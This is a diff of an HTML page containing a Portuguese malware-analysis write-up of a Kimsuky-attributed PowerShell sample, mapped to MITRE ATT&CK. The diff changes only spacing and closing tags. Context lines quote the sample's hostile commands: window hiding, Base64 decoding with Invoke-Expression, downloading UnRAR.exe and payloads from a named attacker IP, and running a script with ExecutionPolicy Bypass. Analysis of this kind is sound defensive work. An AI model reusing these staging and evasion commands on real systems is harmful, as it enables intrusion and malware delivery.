@@ -28,6 +28,7 @@ Tags: Advanced Malware - APT
 3. Mapeamento MITRE ATT&CK
 4. Considerações Finais
 
+
 --[ 1. INTRODUÇÃO ]------------------------------------------------------------------
 
 APT refere-se a grupos de Ameaça Persistente Avançada (Advanced Persistent Threat), 
@@ -37,6 +38,7 @@ A amostra analisada aqui está categorizada como APT & Kimsuky.
 E foi escrita em PowerShell (.ps1), encontrada no Malware Bazaar.  
 
 Objetivo: Aprender técnicas avançadas de evasão e encadeamento (staging).
+
 
 --[ 2. ANÁLISE TÉCNICA ]-------------------------------------------------------------
 
@@ -70,6 +72,7 @@ Valores de sw:
 0 = SW_HIDE → ocultar janela
 5 = SW_SHOW → exibir janela (não utilizado aqui)
 
+
 --[ 2.2 Ocultação de processos via ShowWindow ]-------------------------------------
 
 ```
@@ -84,6 +87,7 @@ Usa Get-Process para encontrar powershell, WindowsTerminal.
 Oculta suas interfaces gráficas (GUI)
 -> evasão visual e furtividade contra analistas ou sandboxes.
 
+
 --[ 2.3 Ofuscação Base64 e execução dinâmica ]--------------------------------------------------------
 
 ```
@@ -96,6 +100,7 @@ Decodifica e executa o código ofuscado via Invoke-Expression.
 
 Note: Este malware veio com ’@’ dentro da ofuscação para evadir a detecção.
 
+
 --[ 2.4 PDF de distração e engenharia social ]------------------------------------------------------------------
 
 ```
@@ -106,6 +111,7 @@ Start-Process -FilePath "Distribution Document.pdf"
 Faz o download e abre um PDF como isca durante a atividade maliciosa.
 IP criminoso: 92.119.114.128
 
+
 --[ 2.5 Ferramentas Externas para Extração de Payload ]--------------------------------------------
 
 ```
@@ -114,6 +120,7 @@ Invoke-WebRequest -Uri "http://92[.]119[.]114[.]128/Assets/UnRAR.exe"
 
 Faz o download do UnRAR.exe para extrair arquivos .rar protegidos por senha.
 Evita o uso do Expand-Archive nativo para evadir a detecção.
+
 
 --[ 2.6 Execução de Payload em Múltiplas Etapas  ]-------------------------------------------------
 
@@ -124,6 +131,7 @@ Start-Process -FilePath orwartde.exe
 
 Usa RAR protegido por senha para extrair binários maliciosos.
 Executa múltiplas etapas (por exemplo, orwartde.exe, enwtsv.exe) para aumentar a persistência.
+
 
 --[ 2.7 Execução de Payload em Múltiplas Etapas ]---------------------------------------------------
 
@@ -140,6 +148,7 @@ cmd.exe /C "powershell -ExecutionPolicy Bypass -File $env:TEMP\ov4_dd_pf.ps1"
 Faz o download de outra carga-útil(Payload) em PowerShell codificada em base64 e a executa.
 Usa o renomeio de .txt para .ps1 para evadir antivírus (AV).
 Executa utilizando ExecutionPolicy Bypass.
+
 
 --[ 3 Mapeamento MITRE ATT&CK ]---------------------------------------------------------------------
 
@@ -167,4 +176,6 @@ Thx for reading! —> @untw0 :D
 
 --[ <a href="index.html">HOME</a> ]--
 
-</pre></div></body>
+</pre>
+</div>
+</body>
